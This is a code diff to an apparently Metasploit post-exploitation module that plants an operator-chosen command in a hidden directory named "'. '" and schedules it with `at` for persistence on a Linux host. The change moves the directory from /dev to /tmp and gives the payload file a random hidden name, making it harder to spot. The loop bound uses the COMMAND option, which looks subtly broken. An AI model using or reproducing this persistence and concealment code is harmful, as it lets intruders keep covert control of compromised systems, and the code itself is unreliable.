@@ -46,10 +46,11 @@ class Metasploit3 < Msf::Post
 		vcmd_exec("touch /var/spool/cron/atjobs/.SEQ")
 		vcmd_exec("cd /var/spool/cron/atjobs")
 		vcmd_exec("chown daemon.daemon .SEQ")
-		vcmd_exec("mkdir -p /dev/'. '")
-		vcmd_exec("echo #{datastore['COMMAND']} >>" +  "/dev/'. '/test.txt")
+		vcmd_exec("mkdir -p /tmp/'. '")
+		file = rand_text_alpha(128)
+		vcmd_exec("echo #{datastore['COMMAND']} >>" +  "/tmp/'. '/.#{file}")
 		for i in 0..datastore['COMMAND']
-			vcmd_exec("at now + #{i} hour -f " +  "/dev/'. '/test.txt")
+			vcmd_exec("at now + #{i} hour -f " +  "/tmp/'. '/.#{file}")
 		end
 	end
 end
